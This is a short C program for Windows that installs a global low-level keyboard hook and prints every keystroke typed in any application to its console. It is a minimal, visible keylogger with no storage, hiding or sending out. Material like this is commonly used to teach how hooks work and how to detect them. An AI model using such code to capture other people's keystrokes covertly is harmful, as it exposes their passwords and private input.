#include "windows.h"
#include <stdio.h>
LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam) 
{
    if (code >= 0 && wParam == WM_KEYDOWN) 
    {
        KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *)lParam;
        switch (pkey->vkCode) 
        {
            case VK_BACK:
                    printf("(BACKSPACE)");
                    break;
            case VK_RETURN:
                    printf("(ENTER)");
                    break;
            case VK_SPACE:
                    printf(" ");
                    break;
            case VK_SHIFT:
                    printf("(Shift)");
                    break;
            default: 
            {
                            char key = MapVirtualKey(pkey->vkCode, MAPVK_VK_TO_CHAR);
                            if (key >= 32 && key <= 126)
                                printf("%c", key);
                            else
                                printf("[0x%x]", pkey->vkCode); 
                                break;
            }
        }
    }

                return CallNextHookEx(NULL, code, wParam, lParam);
}

int main() {
            HHOOK hhook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, NULL, 0);
            if (hhook == NULL) {
             printf("Hook wasn't installed\n");

            return 1;
    }
            printf("Hook was installed\n");
    MSG msg;
            while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
            TranslateMessage(&msg);
             DispatchMessage(&msg);




    }

    UnhookWindowsHookEx(hhook);

    return (0);
}
